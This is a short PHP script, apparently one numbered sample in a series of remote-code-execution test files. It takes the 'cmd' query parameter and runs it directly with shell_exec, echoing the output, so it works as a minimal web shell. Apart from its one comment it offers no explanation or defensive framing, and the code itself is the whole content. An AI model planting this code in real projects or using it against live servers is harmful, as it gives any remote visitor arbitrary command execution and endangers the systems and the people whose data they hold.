<?php
// RCE test variation #1393
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>